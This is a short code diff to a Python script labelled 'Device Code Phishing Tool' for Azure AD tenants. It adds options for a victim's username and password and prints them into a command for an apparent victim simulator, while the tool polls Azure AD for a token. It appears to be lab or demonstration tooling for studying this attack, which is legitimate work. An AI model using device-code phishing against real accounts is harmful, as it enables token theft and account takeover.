@@ -67,6 +67,10 @@ def poll_for_token(tenant: str, device_code: str, interval: int) -> dict:
 def main():
     parser = argparse.ArgumentParser(description="Device Code Phishing Tool")
     parser.add_argument("--tenant", required=True, help="Azure AD tenant ID or primary domain")
+    parser.add_argument("--victim-username", default=None, dest="victim_username",
+                        help="Victim's UPN (pre-fills the simulator command)")
+    parser.add_argument("--victim-password", default=None, dest="victim_password",
+                        help="Victim's password (pre-fills the simulator command)")
     args = parser.parse_args()
 
     print()
@@ -98,13 +102,15 @@ def main():
     print(f"│  Code expires in {expires_in // 60} minutes.                               │")
     print("└──────────────────────────────────────────────────────────────┘")
     print()
+    victim_username = args.victim_username or "<victim_email>"
+    victim_password = args.victim_password or "<victim_password>"
     print("[*] Waiting for victim to authenticate. Run in a second terminal:")
     print()
     print(f"    python3 victim_simulator.py \\")
-    print(f"        --tenant {args.tenant} \\")
-    print(f"        --code   {user_code} \\")
-    print(f"        --username <victim_email> \\")
-    print(f"        --password '<victim_password>'")
+    print(f"        --tenant   {args.tenant} \\")
+    print(f"        --code     {user_code} \\")
+    print(f"        --username {victim_username} \\")
+    print(f"        --password '{victim_password}'")
     print()
     print("[*] Polling Azure AD for token", end="", flush=True)
 
